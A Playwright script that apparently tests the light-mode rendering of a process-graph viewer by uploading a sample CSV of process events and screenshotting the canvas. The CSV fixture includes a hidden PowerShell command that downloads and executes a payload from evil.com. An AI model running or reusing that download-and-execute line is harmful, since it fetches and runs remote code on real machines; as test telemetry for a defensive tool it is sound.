const { chromium } = require('playwright');
const path = require('path');
const fs = require('fs');

(async () => {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  await page.goto('http://localhost:5173');
  await page.waitForTimeout(2000);

  await page.evaluate(() => {
    localStorage.setItem('theme', 'light');
    window.location.reload();
  });
  await page.waitForTimeout(2000);

  const csvContent = `timestamp,process_id,parent_process_id,process_name,action,command_line
2023-10-01T10:00:00Z,1001,1000,svchost.exe,ProcessCreate,"svchost.exe -k netsvcs"
2023-10-01T10:01:00Z,1002,1001,cmd.exe,ProcessCreate,"cmd.exe /c whoami"
2023-10-01T10:02:00Z,1003,1002,powershell.exe,ProcessCreate,"powershell.exe -w hidden -c 'IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com/payload\")'"`;

  const tempCsvPath = path.join(__dirname, 'test_theme2.csv');
  fs.writeFileSync(tempCsvPath, csvContent);

  // Use the hidden file input directly
  const fileInput = await page.$('input[type=file]');
  if (fileInput) {
      await fileInput.setInputFiles(tempCsvPath);
      console.log('File uploaded');
  }

  // wait for cytoscape canvas to render
  try {
     await page.waitForSelector('canvas', { timeout: 10000 });
     await page.waitForTimeout(3000);
     console.log('Canvas loaded');
  } catch (e) {
     console.log('Canvas not found', e);
  }

  await page.waitForTimeout(2000);
  await page.screenshot({ path: 'canvas-light-mode.png', fullPage: true });
  console.log('Screenshot saved to canvas-light-mode.png');
  await browser.close();
})();
